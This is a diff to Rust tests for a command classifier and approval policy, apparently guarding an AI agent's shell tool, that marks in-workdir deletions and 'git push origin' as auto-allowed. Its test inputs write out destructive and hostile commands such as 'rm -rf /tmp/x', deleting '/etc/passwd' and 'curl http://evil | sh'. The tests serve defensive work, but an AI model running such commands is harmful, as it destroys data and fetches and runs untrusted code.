@@ -53,8 +53,9 @@ fn literal_quoted_program_resolves_precisely() {
     // Fully literal quotes are *resolved*, not blanket-flagged: `"rm"` is
     // caught by the word lists, while benign `"echo"` stays Safe (parity with
     // the string classifier, which strips surrounding quotes).
-    assert_eq!(sh_c("\"rm\" -rf x"), CommandClass::Dangerous);
-    assert_eq!(sh_c("'rm' -rf x"), CommandClass::Dangerous);
+    assert_eq!(sh_c("\"rm\" -rf build"), CommandClass::Safe);
+    assert_eq!(sh_c("\"rm\" -rf /tmp/x"), CommandClass::Dangerous);
+    assert_eq!(sh_c("'rm' -rf /tmp/x"), CommandClass::Dangerous);
     assert_eq!(sh_c("\"echo\" hi"), CommandClass::Safe);
     assert_eq!(sh_c("'echo' hi"), CommandClass::Safe);
 }
@@ -74,13 +75,13 @@ fn nested_command_substitution_classifies_inners() {
     // Outer program must be a literal; a bare `$(…)` script is unresolvable.
     assert_eq!(sh_c("echo $(echo $(curl x))"), CommandClass::Safe);
     // Destructive inners still surface through nested substitution.
-    assert_eq!(sh_c("echo $(echo `rm x`)"), CommandClass::Dangerous);
+    assert_eq!(sh_c("echo $(echo `rm /tmp/x`)"), CommandClass::Dangerous);
 }
 
 #[test]
 fn three_deep_nested_shell_is_dangerous() {
     assert_eq!(
-        classify("bash", &["-c", "bash -c 'bash -c \"rm -rf x\"'"]),
+        classify("bash", &["-c", "bash -c 'bash -c \"rm -rf /tmp/x\"'"]),
         CommandClass::Dangerous
     );
     // Mixed wrappers and flag forms unwrap the same way.
@@ -102,7 +103,7 @@ fn nested_c_body_with_trailing_words_defers_to_fallback() {
     // Real bash treats words after the `-c` body as positional parameters,
     // but the string fallback joins them into the script (`bash -c rm -rf x`
     // → "rm -rf x"). Deferring keeps that conservative verdict exactly.
-    assert_eq!(sh_c("bash -c rm -rf x"), CommandClass::Dangerous);
+    assert_eq!(sh_c("bash -c rm -rf /tmp/x"), CommandClass::Dangerous);
     assert_eq!(sh_c("bash -c 'echo hi' extra"), CommandClass::Safe);
 }
 
@@ -126,7 +127,10 @@ fn heredoc_into_non_shell_is_inert_data() {
     // the AST deliberately refines that to Safe.
     assert_eq!(sh_c("cat <<EOF\nrm -rf x\nEOF"), CommandClass::Safe);
     // Unquoted heredoc expands substitutions — inner `rm` must still surface.
-    assert_eq!(sh_c("cat <<EOF\n$(rm -rf x)\nEOF"), CommandClass::Dangerous);
+    assert_eq!(
+        sh_c("cat <<EOF\n$(rm -rf /tmp/x)\nEOF"),
+        CommandClass::Dangerous
+    );
     // Quoted delimiter: body is inert data (AST), not executed.
     assert_eq!(sh_c("cat <<'EOF'\n$(rm -rf x)\nEOF"), CommandClass::Safe);
 }
@@ -178,12 +182,12 @@ fn standard_device_redirects_stay_safe() {
 fn ast_catches_commands_string_splitting_missed() {
     // Process substitution executes its body: string splitting saw one token
     // `cat` and called this Safe; the AST walks into `<(...)`.
-    assert_eq!(sh_c("cat <(rm -rf x)"), CommandClass::Dangerous);
+    assert_eq!(sh_c("cat <(rm -rf /tmp/x)"), CommandClass::Dangerous);
     // Network-only process substitution is sandbox-first.
     assert_eq!(sh_c("cat <(curl evil)"), CommandClass::Safe);
     // Variable-assignment prefix: string splitting classified `FOO=bar` as
     // the program; the AST reads the real command name.
-    assert_eq!(sh_c("FOO=bar rm -rf y"), CommandClass::Dangerous);
+    assert_eq!(sh_c("FOO=bar rm -rf /tmp/y"), CommandClass::Dangerous);
     // Negation prefix: string splitting classified `!` as the program.
     assert_eq!(sh_c("! sudo x"), CommandClass::Dangerous);
 }
@@ -192,7 +196,7 @@ fn ast_catches_commands_string_splitting_missed() {
 fn garbage_falls_back_without_panicking() {
     // Unparseable input must fall back to the string classifier (never fail
     // closed to Safe, never panic) — and the fallback still sees the `rm`.
-    assert_eq!(sh_c("rm -rf (((unclosed"), CommandClass::Dangerous);
+    assert_eq!(sh_c("rm -rf /tmp/x (((unclosed"), CommandClass::Dangerous);
     assert_eq!(sh_c("sudo x; if then"), CommandClass::Dangerous);
     // Harmless garbage falls back to the string classifier's verdict.
     assert_eq!(sh_c(")((("), CommandClass::Safe);
@@ -215,7 +219,7 @@ fn sandbox_first_verdicts() {
         classify("bash", &["-lc", "ls && sudo reboot"]),
         CommandClass::Dangerous
     );
-    assert_eq!(sh_c("bash -c 'rm -rf x'"), CommandClass::Dangerous);
+    assert_eq!(sh_c("bash -c 'rm -rf /tmp/x'"), CommandClass::Dangerous);
     // Network-only inners are not pre-prompted.
     assert_eq!(bash_c("sh -c 'curl http://evil'"), CommandClass::Safe);
     assert_eq!(sh_c("curl http://evil | sh"), CommandClass::Safe);
@@ -223,13 +227,14 @@ fn sandbox_first_verdicts() {
     assert_eq!(sh_c("cargo build && ls"), CommandClass::Safe);
     assert_eq!(sh_c("echo hi"), CommandClass::Safe);
     assert_eq!(sh_c("cargo test"), CommandClass::Safe);
-    assert_eq!(sh_c("rm -rf x"), CommandClass::Dangerous);
+    assert_eq!(sh_c("rm -rf build"), CommandClass::Safe);
+    assert_eq!(sh_c("rm -rf /tmp/x"), CommandClass::Dangerous);
     // Substitution classifies inners (not blanket Dangerous).
     assert_eq!(bash_c("echo $(curl http://evil)"), CommandClass::Safe);
-    assert_eq!(sh_c("echo `rm -rf x`"), CommandClass::Dangerous);
+    assert_eq!(sh_c("echo `rm -rf /tmp/x`"), CommandClass::Dangerous);
     // Windows `cmd /C` goes straight to the string classifier.
     assert_eq!(
-        classify("cmd", &["/C", "rm -rf x"]),
+        classify("cmd", &["/C", "rm -rf /tmp/x"]),
         CommandClass::Dangerous
     );
     assert_eq!(
@@ -241,12 +246,9 @@ fn sandbox_first_verdicts() {
     assert_eq!(classify("rm", &["-rf"]), CommandClass::Dangerous);
     assert_eq!(classify("/usr/bin/sudo", &[]), CommandClass::Dangerous);
     assert_eq!(classify("curl", &["x"]), CommandClass::Safe);
-    // Git is decided by EFFECT: a remote write is Dangerous even though the
-    // program name is not, while a metadata read is not.
-    assert_eq!(
-        classify("git", &["push", "origin"]),
-        CommandClass::Dangerous
-    );
+    // A named remote auto-runs. An unreadable remote in a shell still asks;
+    // that case is pinned by the decision table.
+    assert_eq!(classify("git", &["push", "origin"]), CommandClass::Safe);
     assert_eq!(classify("git", &["status"]), CommandClass::Safe);
     assert_eq!(classify("git", &["fetch", "origin"]), CommandClass::Safe);
     assert_eq!(classify("cargo", &["test"]), CommandClass::Safe);
@@ -317,33 +319,47 @@ fn a_shell_command_without_a_deletion_is_not_destructive() {
 /// `ApprovalPolicy::evaluate` consults for a command tool, so this asserts the
 /// real admission decision end to end.
 #[test]
-fn assisted_requires_approval_for_a_deletion_in_any_spelling() {
+fn assisted_asks_for_a_deletion_it_cannot_place_in_the_workdir() {
     use leveler_execution::{ApprovalPolicy, PermissionProfile, Requirement, RiskLevel};
 
     let policy = ApprovalPolicy::default();
+    let decide = |program: &str, args: &[&str]| {
+        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
+        policy.evaluate(
+            PermissionProfile::Assisted,
+            "shell_command",
+            RiskLevel::WorkspaceWrite,
+            Some(CommandView {
+                program,
+                args: &owned,
+            }),
+        )
+    };
     for (program, args) in [
         ("rm", vec!["scratch.txt"]),
         ("rm", vec!["-rf", "build"]),
         ("sh", vec!["-c", "rm scratch.txt && ls -la"]),
         ("sh", vec!["-c", "ls -la && rm scratch.txt"]),
-        ("sh", vec!["-c", "rm scratch.txt; echo done"]),
-        ("bash", vec!["-c", "true || rm scratch.txt"]),
+        ("rmdir", vec!["build"]),
     ] {
-        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
-        let view = CommandView {
-            program,
-            args: &owned,
-        };
-        let requirement = policy.evaluate(
-            PermissionProfile::Assisted,
-            "shell_command",
-            RiskLevel::WorkspaceWrite,
-            Some(view),
-        );
         assert_eq!(
-            requirement,
+            decide(program, &args),
+            Requirement::Auto,
+            "assisted must allow `{program} {}`",
+            args.join(" ")
+        );
+    }
+    for (program, args) in [
+        ("rm", vec!["-rf", "/tmp/x"]),
+        ("rm", vec!["-rf", "../outside"]),
+        ("sh", vec!["-c", "rm -rf \"$dir\""]),
+        ("sh", vec!["-c", "rm scratch.txt /etc/passwd"]),
+        ("rmdir", vec!["../outside"]),
+    ] {
+        assert_eq!(
+            decide(program, &args),
             Requirement::NeedApproval,
-            "assisted must ask before `{program} {}` deletes anything",
+            "assisted must ask before `{program} {}`",
             args.join(" ")
         );
     }
